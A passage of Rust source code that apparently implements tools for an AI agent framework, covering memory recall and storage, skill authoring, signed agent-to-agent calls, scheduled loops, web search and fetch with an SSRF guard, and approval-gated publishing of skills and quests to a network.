    fn spec(&self) -> ToolSpec {
        spec!(
            "recall",
            "Hybrid search (keyword + semantic + knowledge graph) across past conversations and the memory vault. Use before asking the user something they may have already told you.",
            json!({"type":"object","properties":{"query":{"type":"string"}},"required":["query"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::ReadOnly
    }
    async fn invoke(&self, cx: &ToolCx, args: Value) -> ToolOutput {
        let query = match arg_str(&args, "query") {
            Ok(q) => q,
            Err(e) => return e,
        };
        if let Some(memory) = &cx.memory {
            return match memory.recall(query, 10).await {
                Ok(memories) if memories.is_empty() => ToolOutput::ok("no matches".to_string()),
                Ok(memories) => ToolOutput::ok(
                    memories
                        .iter()
                        .map(|m| {
                            let label = m.note.as_deref().unwrap_or("conversation");
                            format!("- [{label}] {}", m.text)
                        })
                        .collect::<Vec<_>>()
                        .join("\n"),
                ),
                Err(err) => ToolOutput::err(format!("recall failed: {err:#}")),
            };
        }
        // Memory disabled: plain FTS fallback.
        match cx.store.recall_search(query, 8).await {
            Ok(hits) if hits.is_empty() => ToolOutput::ok("no matches".to_string()),
            Ok(hits) => ToolOutput::ok(
                hits.iter()
                    .map(|h| format!("[{}#{}] {}", h.source, h.reference, h.snippet))
                    .collect::<Vec<_>>()
                    .join("\n"),
            ),
            Err(err) => ToolOutput::err(format!("recall failed: {err:#}")),
        }
    }
}

struct MemorySave;

#[async_trait::async_trait]
impl Tool for MemorySave {
    fn spec(&self) -> ToolSpec {
        spec!(
            "memory_save",
            "Save a durable memory to the vault (events, project facts, decisions, relationships). Use memory_append only for core owner-profile facts.",
            json!({"type":"object","properties":{"content":{"type":"string"}},"required":["content"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::WriteWorkspace
    }
    async fn invoke(&self, cx: &ToolCx, args: Value) -> ToolOutput {
        let content = match arg_str(&args, "content") {
            Ok(c) => c,
            Err(e) => return e,
        };
        let Some(memory) = &cx.memory else {
            return ToolOutput::err("memory engine is disabled".to_string());
        };
        match memory.save(content, cx.session_id).await {
            Ok(path) => ToolOutput::ok(format!("saved to {path}")),
            Err(err) => ToolOutput::err(format!("memory_save failed: {err:#}")),
        }
    }
}

struct MemoryRead {
    home: Home,
}

#[async_trait::async_trait]
impl Tool for MemoryRead {
    fn spec(&self) -> ToolSpec {
        spec!(
            "memory_read",
            "Read MEMORY.md — durable facts about the owner and standing instructions.",
            json!({"type":"object","properties":{}})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::ReadOnly
    }
    async fn invoke(&self, _cx: &ToolCx, _args: Value) -> ToolOutput {
        match std::fs::read_to_string(self.home.workspace_dir().join("MEMORY.md")) {
            Ok(content) => ToolOutput::ok(content),
            Err(_) => ToolOutput::ok("(MEMORY.md is empty — nothing remembered yet)".to_string()),
        }
    }
}

struct MemoryAppend {
    home: Home,
}

#[async_trait::async_trait]
impl Tool for MemoryAppend {
    fn spec(&self) -> ToolSpec {
        spec!(
            "memory_append",
            "Append a durable fact to MEMORY.md (one concise line: owner preferences, standing instructions, important facts).",
            json!({"type":"object","properties":{"fact":{"type":"string"}},"required":["fact"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::WriteWorkspace
    }
    async fn invoke(&self, cx: &ToolCx, args: Value) -> ToolOutput {
        let fact = match arg_str(&args, "fact") {
            Ok(f) => f,
            Err(e) => return e,
        };
        let path = self.home.workspace_dir().join("MEMORY.md");
        let mut current = std::fs::read_to_string(&path).unwrap_or_default();
        if current.len() + fact.len() > 8_192 {
            return ToolOutput::err(
                "MEMORY.md is at its size cap — consolidate existing entries before adding more"
                    .to_string(),
            );
        }
        if !current.is_empty() && !current.ends_with('\n') {
            current.push('\n');
        }
        current.push_str(&format!("- {fact}\n"));
        if let Err(err) = std::fs::write(&path, &current) {
            return ToolOutput::err(format!("writing MEMORY.md: {err}"));
        }
        let _ = cx.store.recall_index("memory", "MEMORY.md", &current).await;
        ToolOutput::ok("remembered".to_string())
    }
}

// ---- skills ----

struct UseSkill {
    skills: Arc<SkillIndex>,
}

#[async_trait::async_trait]
impl Tool for UseSkill {
    fn spec(&self) -> ToolSpec {
        spec!(
            "use_skill",
            "Load the full instructions of a skill by name (see the skills index in your system prompt).",
            json!({"type":"object","properties":{"name":{"type":"string"}},"required":["name"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::ReadOnly
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let name = match arg_str(&args, "name") {
            Ok(n) => n,
            Err(e) => return e,
        };
        match self.skills.body(name) {
            Ok(body) => ToolOutput::ok(truncate_result(body)),
            Err(err) => ToolOutput::err(format!("{err:#}")),
        }
    }
}

struct FindSkill {
    skills: Arc<SkillIndex>,
}

#[async_trait::async_trait]
impl Tool for FindSkill {
    fn spec(&self) -> ToolSpec {
        spec!(
            "find_skill",
            "Search installed skills by keyword when the index in your prompt doesn't obviously cover the task.",
            json!({"type":"object","properties":{"query":{"type":"string"}},"required":["query"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::ReadOnly
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let query = match arg_str(&args, "query") {
            Ok(q) => q,
            Err(e) => return e,
        };
        let hits = self.skills.find(query);
        if hits.is_empty() {
            ToolOutput::ok("no matching skills".to_string())
        } else {
            ToolOutput::ok(
                hits.iter()
                    .map(|s| format!("- {}: {}", s.name, s.description))
                    .collect::<Vec<_>>()
                    .join("\n"),
            )
        }
    }
}

struct SkillWrite {
    skills: Arc<SkillIndex>,
}

#[async_trait::async_trait]
impl Tool for SkillWrite {
    fn spec(&self) -> ToolSpec {
        spec!(
            "skill_create",
            "Author or update a skill so you can reuse a capability later. Provide a kebab-case name, a one-line description (this is what future-you sees to decide when to load it), and the full instructions as the body. The skill is available immediately.",
            json!({"type":"object","properties":{
                "name":{"type":"string","description":"kebab-case, e.g. draft-standup-update"},
                "description":{"type":"string","description":"one line: when should this skill be used"},
                "body":{"type":"string","description":"the full skill instructions (markdown)"}
            },"required":["name","description","body"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::WriteWorkspace
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let (name, description, body) = match (
            arg_str(&args, "name"),
            arg_str(&args, "description"),
            arg_str(&args, "body"),
        ) {
            (Ok(n), Ok(d), Ok(b)) => (n, d, b),
            (Err(e), ..) | (_, Err(e), _) | (_, _, Err(e)) => return e,
        };
        match self.skills.write_skill(name, description, body) {
            Ok(()) => ToolOutput::ok(format!(
                "skill '{name}' saved and indexed — you can use_skill it now"
            )),
            Err(err) => ToolOutput::err(format!("{err:#}")),
        }
    }
}

/// Delegate to another agent over A2A. By default the call is proxied through
/// the gateway (governed egress); `via_gateway=false` means a direct call on a
/// trusted substrate. Never talks to an unlisted URL.
pub struct CallAgent {
    targets: Vec<A2aTarget>,
    http: reqwest::Client,
    home: Home,
}

impl CallAgent {
    pub fn new(targets: Vec<A2aTarget>, home: Home) -> Self {
        CallAgent {
            targets,
            http: reqwest::Client::builder()
                .timeout(std::time::Duration::from_secs(120))
                .build()
                .expect("reqwest client"),
            home,
        }
    }
}

#[async_trait::async_trait]
impl Tool for CallAgent {
    fn spec(&self) -> ToolSpec {
        let roster = self
            .targets
            .iter()
            .map(|t| {
                format!("{} ({})", t.name, if t.via_gateway { "via gateway" } else { "direct" })
            })
            .collect::<Vec<_>>()
            .join(", ");
        spec!(
            "call_agent",
            format!(
                "Delegate a task to another agent over A2A and return its reply. Known agents: {roster}."
            ),
            json!({"type":"object","properties":{
                "agent":{"type":"string","description":"name of a configured agent"},
                "message":{"type":"string"}
            },"required":["agent","message"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::Network
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let (agent, message) = match (arg_str(&args, "agent"), arg_str(&args, "message")) {
            (Ok(a), Ok(m)) => (a, m),
            (Err(e), _) | (_, Err(e)) => return e,
        };
        let Some(target) = self.targets.iter().find(|t| t.name == agent) else {
            return ToolOutput::err(format!(
                "unknown agent '{agent}' — configure it under [[a2a_agents]]"
            ));
        };
        let body = json!({
            "jsonrpc": "2.0",
            "id": "1",
            "method": "message/send",
            "params": { "message": { "role": "user", "parts": [{ "kind": "text", "text": message }] } }
        });
        // Sign the exact body bytes with this node's identity so the receiver
        // can authenticate WHO is calling (and scale trust by our standing) —
        // a bearer token alone proves nothing about identity.
        let raw = serde_json::to_vec(&body).unwrap_or_default();
        let mut req = self.http.post(&target.url).body(raw.clone());
        req = req.header("content-type", "application/json");
        if let Ok(idk) = revenant_net::Identity::load_or_create(&self.home.identity_dir()) {
            let ts = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_secs() as i64)
                .unwrap_or(0);
            let nonce = format!(
                "{:x}",
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|d| d.as_nanos())
                    .unwrap_or(0)
            );
            let sig = revenant_net::a2a::sign(&idk, &raw, ts, &nonce);
            req = req
                .header(revenant_net::a2a::HDR_AGENT, idk.id())
                .header(revenant_net::a2a::HDR_TS, ts.to_string())
                .header(revenant_net::a2a::HDR_NONCE, nonce)
                .header(revenant_net::a2a::HDR_SIG, sig);
        }
        if let Some(token) = &target.token {
            req = req.bearer_auth(token);
        }
        let resp = match req.send().await {
            Ok(r) => r,
            Err(err) => return ToolOutput::err(format!("A2A call to '{agent}' failed: {err}")),
        };
        if !resp.status().is_success() {
            return ToolOutput::err(format!("agent '{agent}' returned {}", resp.status()));
        }
        let value: Value = match resp.json().await {
            Ok(v) => v,
            Err(err) => return ToolOutput::err(format!("bad A2A response from '{agent}': {err}")),
        };
        if let Some(err) = value.get("error") {
            return ToolOutput::err(format!("agent '{agent}' error: {err}"));
        }
        // A2A reply: result.parts[].text (message) — concatenate text parts.
        let text = value
            .pointer("/result/parts")
            .and_then(|p| p.as_array())
            .map(|parts| {
                parts
                    .iter()
                    .filter_map(|p| p.get("text").and_then(|t| t.as_str()))
                    .collect::<Vec<_>>()
                    .join("\n")
            })
            .unwrap_or_default();
        if text.is_empty() {
            ToolOutput::ok("(agent returned no text)".to_string())
        } else {
            ToolOutput::ok(truncate_result(text))
        }
    }
}

struct LoopCreate;

#[async_trait::async_trait]
impl Tool for LoopCreate {
    fn spec(&self) -> ToolSpec {
        spec!(
            "loop_create",
            "Create a recurring job that runs a prompt on a schedule (heartbeat/cron). Use for standing tasks: check something periodically, a daily summary, a watch. Runs off the main thread; results appear in loop history and can be pushed to a channel.",
            json!({"type":"object","properties":{
                "name":{"type":"string"},
                "schedule":{"type":"string","description":"'every:600s' (min 60s) or 'cron:*/10 * * * *'"},
                "prompt":{"type":"string","description":"what to do each run"},
                "tier":{"type":"string","enum":["fast","balanced","deep","local"],"description":"default fast"},
                "channel_out":{"type":"string","description":"optional: 'telegram' to push results to paired chats"}
            },"required":["name","schedule","prompt"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        // Creating a spending, self-firing job is a capability escalation.
        PermissionTier::Dangerous
    }
    async fn invoke(&self, cx: &ToolCx, args: Value) -> ToolOutput {
        let (name, schedule, prompt) = match (
            arg_str(&args, "name"),
            arg_str(&args, "schedule"),
            arg_str(&args, "prompt"),
        ) {
            (Ok(n), Ok(s), Ok(p)) => (n, s, p),
            (Err(e), ..) | (_, Err(e), _) | (_, _, Err(e)) => return e,
        };
        let tier = args.get("tier").and_then(|v| v.as_str()).unwrap_or("fast");
        let channel_out = args.get("channel_out").and_then(|v| v.as_str());

        // Validate schedule + get first fire time (enforces the 60s floor).
        let now = unix_now();
        let next_run = match revenant_core::loops::first_next_run(schedule, now) {
            Ok(n) => n,
            Err(err) => return ToolOutput::err(format!("{err:#}")),
        };
        // Cap total loops.
        match cx.store.loops_list().await {
            Ok(loops) if loops.len() >= revenant_core::loops::MAX_LOOPS => {
                return ToolOutput::err(format!(
                    "loop limit reached ({}); delete one first",
                    revenant_core::loops::MAX_LOOPS
                ));
            }
            _ => {}
        }
        let id = format!("lp-{}", uuid_short());
        match cx
            .store
            .loop_upsert(&id, name, schedule, prompt, tier, channel_out, 48, "agent", next_run)
            .await
        {
            Ok(()) => ToolOutput::ok(format!("loop '{name}' created ({id}), first run soon")),
            Err(err) => ToolOutput::err(format!("{err:#}")),
        }
    }
}

struct LoopControl;

#[async_trait::async_trait]
impl Tool for LoopControl {
    fn spec(&self) -> ToolSpec {
        spec!(
            "loop_control",
            "Inspect and control loops. action: list | runs | pause | resume | delete. 'runs' shows a loop's recent outcomes (use it to decide how to tune). All but 'list' need the loop id.",
            json!({"type":"object","properties":{
                "action":{"type":"string","enum":["list","runs","pause","resume","delete"]},
                "id":{"type":"string"}
            },"required":["action"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        // Listing/pausing is harmless; the create path is the guarded one.
        PermissionTier::ReadOnly
    }
    async fn invoke(&self, cx: &ToolCx, args: Value) -> ToolOutput {
        let action = match arg_str(&args, "action") {
            Ok(a) => a,
            Err(e) => return e,
        };
        match action {
            "list" => match cx.store.loops_list().await {
                Ok(loops) if loops.is_empty() => ToolOutput::ok("no loops defined".to_string()),
                Ok(loops) => ToolOutput::ok(
                    loops
                        .iter()
                        .map(|l| {
                            format!(
                                "- {} [{}] {} · tier {} · {}",
                                l.id,
                                if l.enabled { "on" } else { "paused" },
                                l.schedule,
                                l.tier,
                                l.name
                            )
                        })
                        .collect::<Vec<_>>()
                        .join("\n"),
                ),
                Err(err) => ToolOutput::err(format!("{err:#}")),
            },
            "pause" | "resume" => {
                let id = match arg_str(&args, "id") {
                    Ok(i) => i,
                    Err(e) => return e,
                };
                match cx.store.loop_set_enabled(id, action == "resume").await {
                    Ok(true) => ToolOutput::ok(format!("loop {id} {action}d")),
                    Ok(false) => ToolOutput::err(format!("no loop {id}")),
                    Err(err) => ToolOutput::err(format!("{err:#}")),
                }
            }
            "delete" => {
                let id = match arg_str(&args, "id") {
                    Ok(i) => i,
                    Err(e) => return e,
                };
                match cx.store.loop_delete(id).await {
                    Ok(true) => ToolOutput::ok(format!("loop {id} deleted")),
                    Ok(false) => ToolOutput::err(format!("no loop {id}")),
                    Err(err) => ToolOutput::err(format!("{err:#}")),
                }
            }
            "runs" => {
                let id = match arg_str(&args, "id") {
                    Ok(i) => i,
                    Err(e) => return e,
                };
                match cx.store.loop_runs(id, 15).await {
                    Ok(runs) if runs.is_empty() => ToolOutput::ok("no runs yet".to_string()),
                    Ok(runs) => ToolOutput::ok(
                        runs.iter()
                            .map(|r| {
                                format!(
                                    "{} · {}in/{}out tok · {}",
                                    r.status,
                                    r.tokens_in,
                                    r.tokens_out,
                                    r.outcome.as_deref().unwrap_or("")
                                )
                            })
                            .collect::<Vec<_>>()
                            .join("\n"),
                    ),
                    Err(err) => ToolOutput::err(format!("{err:#}")),
                }
            }
            other => ToolOutput::err(format!("unknown action '{other}'")),
        }
    }
}

struct LoopUpdate;

#[async_trait::async_trait]
impl Tool for LoopUpdate {
    fn spec(&self) -> ToolSpec {
        spec!(
            "loop_update",
            "Tune an existing loop: change its schedule, prompt, or tier. Use this to self-tune — e.g. slow down a loop that keeps finding nothing, or make a valuable one cheaper. Only omitted fields are kept.",
            json!({"type":"object","properties":{
                "id":{"type":"string"},
                "schedule":{"type":"string","description":"new 'every:<n>s' or 'cron:...' (optional)"},
                "prompt":{"type":"string","description":"new prompt (optional)"},
                "tier":{"type":"string","enum":["fast","balanced","deep","local"]}
            },"required":["id"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        // Tuning an existing loop (not spawning a new spender) — WriteWorkspace.
        PermissionTier::WriteWorkspace
    }
    async fn invoke(&self, cx: &ToolCx, args: Value) -> ToolOutput {
        let id = match arg_str(&args, "id") {
            Ok(i) => i,
            Err(e) => return e,
        };
        let current = match cx.store.loop_get(id).await {
            Ok(Some(l)) => l,
            Ok(None) => return ToolOutput::err(format!("no loop {id}")),
            Err(err) => return ToolOutput::err(format!("{err:#}")),
        };
        let schedule = args.get("schedule").and_then(|v| v.as_str()).unwrap_or(&current.schedule);
        let prompt = args.get("prompt").and_then(|v| v.as_str()).unwrap_or(&current.prompt);
        let tier = args.get("tier").and_then(|v| v.as_str()).unwrap_or(&current.tier);
        // Validate + recompute next fire (enforces the interval floor).
        let next_run = match revenant_core::loops::first_next_run(schedule, unix_now()) {
            Ok(n) => n,
            Err(err) => return ToolOutput::err(format!("{err:#}")),
        };
        match cx.store.loop_retune(id, schedule, prompt, tier, next_run).await {
            Ok(true) => ToolOutput::ok(format!("loop {id} retuned: {schedule} · {tier}")),
            Ok(false) => ToolOutput::err(format!("no loop {id}")),
            Err(err) => ToolOutput::err(format!("{err:#}")),
        }
    }
}

fn uuid_short() -> String {
    // Cheap unique-ish id without pulling uuid into this crate's surface.
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    format!("{now:x}")
}

fn unix_now() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}

struct ReadSkillFile {
    skills: Arc<SkillIndex>,
}

#[async_trait::async_trait]
impl Tool for ReadSkillFile {
    fn spec(&self) -> ToolSpec {
        spec!(
            "read_skill_file",
            "Read a reference file or script bundled inside a skill's directory.",
            json!({"type":"object","properties":{"name":{"type":"string"},"path":{"type":"string"}},"required":["name","path"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::ReadOnly
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let (name, path) = match (arg_str(&args, "name"), arg_str(&args, "path")) {
            (Ok(n), Ok(p)) => (n, p),
            (Err(e), _) | (_, Err(e)) => return e,
        };
        match self.skills.read_file(name, path) {
            Ok(content) => ToolOutput::ok(truncate_result(content)),
            Err(err) => ToolOutput::err(format!("{err:#}")),
        }
    }
}

// ---- web (autoresearch primitives) ----

struct WebSearch {
    http: reqwest::Client,
}

#[async_trait::async_trait]
impl Tool for WebSearch {
    fn spec(&self) -> ToolSpec {
        spec!(
            "web_search",
            "Search the web and get a ranked list of {title, url, snippet}. Use this to find sources, then web_fetch the promising URLs. Provider-agnostic (DuckDuckGo).",
            json!({"type":"object","properties":{"query":{"type":"string"},"limit":{"type":"integer","description":"max results (default 8)"}},"required":["query"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::Network
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let query = match arg_str(&args, "query") {
            Ok(q) => q,
            Err(e) => return e,
        };
        let limit = args.get("limit").and_then(|v| v.as_u64()).unwrap_or(8).clamp(1, 20) as usize;
        // DuckDuckGo's HTML endpoint takes the query as a POST form field.
        let resp = self
            .http
            .post("https://html.duckduckgo.com/html/")
            .form(&[("q", query)])
            .send()
            .await;
        let body = match resp {
            Ok(r) => match r.text().await {
                Ok(b) => b,
                Err(e) => return ToolOutput::err(format!("web_search read error: {e}")),
            },
            Err(e) => return ToolOutput::err(format!("web_search request failed: {e}")),
        };
        let results = parse_ddg(&body, limit);
        if results.is_empty() {
            return ToolOutput::ok(format!(
                "No results parsed for {query:?}. The engine may have changed format or rate-limited; try web_fetch on a known URL instead."
            ));
        }
        let mut out = format!("Search results for {query:?}:\n\n");
        for (i, (title, url, snippet)) in results.iter().enumerate() {
            out.push_str(&format!("{}. {}\n   {}\n   {}\n\n", i + 1, title, url, snippet));
        }
        ToolOutput::ok(truncate_result(out))
    }
}

struct WebFetch {
    http: reqwest::Client,
}

#[async_trait::async_trait]
impl Tool for WebFetch {
    fn spec(&self) -> ToolSpec {
        spec!(
            "web_fetch",
            "Fetch a URL and return its readable text content (HTML stripped). Use after web_search, or on any URL the owner gives you.",
            json!({"type":"object","properties":{"url":{"type":"string"}},"required":["url"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::Network
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let url = match arg_str(&args, "url") {
            Ok(u) => u,
            Err(e) => return e,
        };
        if !url.starts_with("http://") && !url.starts_with("https://") {
            return ToolOutput::err("url must start with http:// or https://");
        }
        // SSRF guard: never let the model reach internal/cloud-metadata targets.
        if let Err(reason) = ssrf_check(url).await {
            return ToolOutput::err(reason);
        }
        let resp = match self.http.get(url).send().await {
            Ok(r) => r,
            Err(e) => return ToolOutput::err(format!("web_fetch request failed: {e}")),
        };
        let status = resp.status();
        let ctype = resp
            .headers()
            .get(reqwest::header::CONTENT_TYPE)
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_string();
        let body = match resp.text().await {
            Ok(b) => b,
            Err(e) => return ToolOutput::err(format!("web_fetch read error: {e}")),
        };
        if !status.is_success() {
            return ToolOutput::err(format!("web_fetch got HTTP {status} for {url}"));
        }
        let text = if ctype.contains("html") || body.trim_start().starts_with('<') {
            html_to_text(&body)
        } else {
            body
        };
        ToolOutput::ok(truncate_result(format!("{url}\n\n{text}")))
    }
}

/// Publish local skills/plugins to the revenant network (the Necropolis) in a
/// SINGLE call — signs each artifact under this node's identity and pushes it.
/// One tool turn, one approval, N artifacts: the fix for shelling out `revenant
/// net publish` once per file (which fanned out across dozens of tool turns).
/// Resolve the network directory URL: `REVENANT_NECROPOLIS` override, else the
/// configured `network.necropolis_url` (only when the network is enabled).
/// Shared by every network-facing tool.
fn necropolis_url(home: &Home) -> Option<String> {
    if let Ok(u) = std::env::var("REVENANT_NECROPOLIS") {
        if !u.trim().is_empty() {
            return Some(u);
        }
    }
    let raw = std::fs::read_to_string(home.config_path()).ok()?;
    let cfg = revenant_core::config::Config::from_toml(&raw).ok()?;
    if !cfg.network.enabled {
        return None;
    }
    cfg.network.necropolis_url
}

/// Filesystem-safe slug for an adopted artifact's install path.
fn net_slug(title: &str) -> String {
    let s: String = title
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c.to_ascii_lowercase() } else { '-' })
        .collect();
    let s = s.trim_matches('-').to_string();
    if s.is_empty() {
        "artifact".to_string()
    } else {
        s
    }
}

struct NetPublish {
    home: Home,
}

impl NetPublish {
    /// Collect (title, description, payload_bytes) for the requested kind,
    /// honoring an optional name filter. Skills = `<skills_dir>/<name>/SKILL.md`
    /// (description pulled from the frontmatter); plugins = `<plugins_dir>/*.wasm`.
    fn collect(&self, kind: &str, names: &[String]) -> Result<Vec<(String, String, Vec<u8>)>, String> {
        let want = |n: &str| names.is_empty() || names.iter().any(|x| x == n);
        let mut out = Vec::new();
        match kind {
            "skill" => {
                let dir = self.home.skills_dir();
                let entries = std::fs::read_dir(&dir)
                    .map_err(|e| format!("reading skills dir {}: {e}", dir.display()))?;
                for entry in entries.flatten() {
                    let name = entry.file_name().to_string_lossy().to_string();
                    let manifest = entry.path().join("SKILL.md");
                    if manifest.is_file() && want(&name) {
                        match std::fs::read(&manifest) {
                            Ok(bytes) => {
                                let desc = revenant_net::artifact::frontmatter_description(
                                    &String::from_utf8_lossy(&bytes),
                                )
                                .unwrap_or_default();
                                out.push((name, desc, bytes));
                            }
                            Err(e) => return Err(format!("reading {}: {e}", manifest.display())),
                        }
                    }
                }
            }
            "plugin" => {
                let dir = self.home.plugins_dir();
                let entries = std::fs::read_dir(&dir)
                    .map_err(|e| format!("reading plugins dir {}: {e}", dir.display()))?;
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.extension().and_then(|e| e.to_str()) != Some("wasm") {
                        continue;
                    }
                    let stem = path.file_stem().unwrap_or_default().to_string_lossy().to_string();
                    if want(&stem) {
                        match std::fs::read(&path) {
                            Ok(bytes) => out.push((stem, String::new(), bytes)),
                            Err(e) => return Err(format!("reading {}: {e}", path.display())),
                        }
                    }
                }
            }
            other => return Err(format!("unknown kind '{other}' (expected 'skill' or 'plugin')")),
        }
        Ok(out)
    }
}

#[async_trait::async_trait]
impl Tool for NetPublish {
    fn spec(&self) -> ToolSpec {
        spec!(
            "net_publish",
            "Publish your local skills or plugins to the revenant network (the Necropolis) so other revenants can adopt them. Publishes ALL of the chosen kind in one call (or a subset via `names`) — do NOT call it once per item. Signs each artifact under your identity. The owner is asked to approve once for the whole batch; a denial is a normal outcome. Requires the network enabled and this node bound to a verified account.",
            json!({
                "type": "object",
                "properties": {
                    "kind": {"type": "string", "enum": ["skill", "plugin"], "description": "What to publish (default: skill)."},
                    "names": {"type": "array", "items": {"type": "string"}, "description": "Optional: only publish these skill/plugin names. Omit to publish all."}
                }
            })
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::Publish
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let kind = args.get("kind").and_then(|v| v.as_str()).unwrap_or("skill");
        let names: Vec<String> = args
            .get("names")
            .and_then(|v| v.as_array())
            .map(|a| a.iter().filter_map(|x| x.as_str().map(String::from)).collect())
            .unwrap_or_default();

        let Some(url) = necropolis_url(&self.home) else {
            return ToolOutput::err(
                "network publishing is unavailable — set [network].enabled = true and network.necropolis_url in config (or REVENANT_NECROPOLIS).",
            );
        };
        let items = match self.collect(kind, &names) {
            Ok(v) => v,
            Err(e) => return ToolOutput::err(e),
        };
        if items.is_empty() {
            return ToolOutput::ok(format!("nothing to publish — no {kind}s matched."));
        }
        let id = match revenant_net::Identity::load_or_create(&self.home.identity_dir()) {
            Ok(i) => i,
            Err(e) => return ToolOutput::err(format!("loading identity: {e}")),
        };
        let art_kind = if kind == "plugin" {
            revenant_net::ArtifactKind::Plugin
        } else {
            revenant_net::ArtifactKind::Skill
        };
        let client = revenant_net::NecropolisClient::new(&url);
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_secs() as i64)
            .unwrap_or(0);

        let (mut ok, mut failed) = (0usize, 0usize);
        let mut lines = Vec::new();
        for (title, desc, bytes) in items {
            let artifact =
                revenant_net::Artifact::create(&id, art_kind, title.clone(), desc, &bytes, None, now);
            match client.publish(&artifact).await {
                Ok(aid) => {
                    ok += 1;
                    lines.push(format!("✅ {title} → {}", &aid[..12.min(aid.len())]));
                }
                Err(e) => {
                    failed += 1;
                    lines.push(format!("❌ {title} — {e}"));
                }
            }
        }
        let summary = format!(
            "published {ok} {kind}(s){} to {url}\n{}",
            if failed > 0 { format!(", {failed} failed") } else { String::new() },
            lines.join("\n"),
        );
        // A total failure (e.g. 403: node not bound to a verified account) is an
        // error result so the model surfaces it rather than claiming success.
        if ok == 0 {
            ToolOutput::err(summary)
        } else {
            ToolOutput::ok(summary)
        }
    }
}

/// Wall-clock unix seconds for signed network types.
fn net_now() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}

/// Post a signed Quest to the horde — a decomposed problem other revenants can
/// claim and solve. THIS is how you "publish a quest for another agent to pick
/// up" (net_publish is for finished skills/plugins, not work requests).
struct QuestPost {
    home: Home,
}

#[async_trait::async_trait]
impl Tool for QuestPost {
    fn spec(&self) -> ToolSpec {
        spec!(
            "quest_post",
            "Publish a QUEST to the revenant network — a problem, broken into tasks, that OTHER \
revenants can claim and solve for you (distributed solving). This is the tool for 'post a quest / \
put out a request for the horde to build X'. Give a title, an overall spec (shared context), and \
the tasks (each a concrete unit of work); optionally a credit bounty (escrowed from your balance, \
split across tasks, released to solvers on acceptance) and sigils (categories that route it to \
matching workers). Requires the network enabled + this node bound to a verified account. Signs the \
quest under your identity; the owner approves the post once.",
            json!({
                "type": "object",
                "properties": {
                    "title": {"type": "string", "description": "short name for the quest"},
                    "spec": {"type": "string", "description": "the overall problem / shared context for all tasks"},
                    "tasks": {"type": "array", "items": {"type": "string"}, "description": "the tasks to distribute (each a concrete unit of work); if omitted, the spec becomes a single task"},
                    "bounty": {"type": "integer", "description": "optional credit reward, escrowed + split across tasks (default 0 = reputation only)"},
                    "sigils": {"type": "array", "items": {"type": "string"}, "description": "optional categories, e.g. [\"math\",\"coding\"], matched to workers' allowed sigils"}
                },
                "required": ["title"]
            })
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::Publish
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let title = args.get("title").and_then(|v| v.as_str()).unwrap_or("").trim().to_string();
        if title.is_empty() {
            return ToolOutput::err("a quest needs a title");
        }
        let spec = args.get("spec").and_then(|v| v.as_str()).unwrap_or("").trim().to_string();
        let tasks_in: Vec<String> = args
            .get("tasks")
            .and_then(|v| v.as_array())
            .map(|a| a.iter().filter_map(|x| x.as_str().map(|s| s.trim().to_string())).filter(|s| !s.is_empty()).collect())
            .unwrap_or_default();
        let sigils: Vec<String> = args
            .get("sigils")
            .and_then(|v| v.as_array())
            .map(|a| a.iter().filter_map(|x| x.as_str().map(String::from)).collect())
            .unwrap_or_default();
        let bounty = args.get("bounty").and_then(|v| v.as_u64()).unwrap_or(0);

        let Some(url) = necropolis_url(&self.home) else {
            return ToolOutput::err(
                "network isn't configured — set [network].enabled = true and network.necropolis_url in config, then bind this node with `revenant net join <email>`.",
            );
        };
        let id = match revenant_net::Identity::load_or_create(&self.home.identity_dir()) {
            Ok(i) => i,
            Err(e) => return ToolOutput::err(format!("loading identity: {e}")),
        };
        let tasks: Vec<revenant_net::quest::Task> = if tasks_in.is_empty() {
            vec![revenant_net::quest::Task {
                id: "t0".into(),
                spec: if spec.is_empty() { title.clone() } else { spec.clone() },
                verify: String::new(),
            }]
        } else {
            tasks_in
                .iter()
                .enumerate()
                .map(|(n, s)| revenant_net::quest::Task { id: format!("t{n}"), spec: s.clone(), verify: String::new() })
                .collect()
        };
        let n = tasks.len();
